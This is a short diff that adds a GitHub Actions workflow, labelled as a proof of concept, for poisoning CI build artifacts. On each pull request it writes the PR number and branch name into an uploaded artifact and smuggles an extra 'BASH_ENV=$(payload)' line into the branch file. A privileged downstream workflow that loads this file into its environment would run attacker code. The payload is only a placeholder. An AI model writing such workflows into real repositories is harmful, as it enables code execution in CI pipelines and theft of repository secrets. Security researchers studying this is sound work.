@@ -1,0 +1,15 @@
+on: pull_request
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          mkdir -p ./pr
+          echo "${{ github.event.number }}" > ./pr/number
+          echo "${{ github.head_ref }}\nBASH_ENV=$(payload)" >> ./pr/branch
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: pr
+          path: pr/
